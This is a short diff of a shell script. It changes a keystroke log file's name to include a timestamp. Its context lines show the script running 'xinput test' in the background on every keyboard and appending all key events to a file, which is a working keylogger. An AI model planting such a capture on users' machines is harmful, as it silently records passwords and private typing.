@@ -8,7 +8,9 @@ then
   git pull
   git checkout -b client
 fi
-outputFile="$path/keycap$$"
+date=`date`
+date=${date// /_}
+outputFile="$path/keycap$$_$date"
 echo `date` >> $outputFile
 (xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test >> $outputFile) &
 
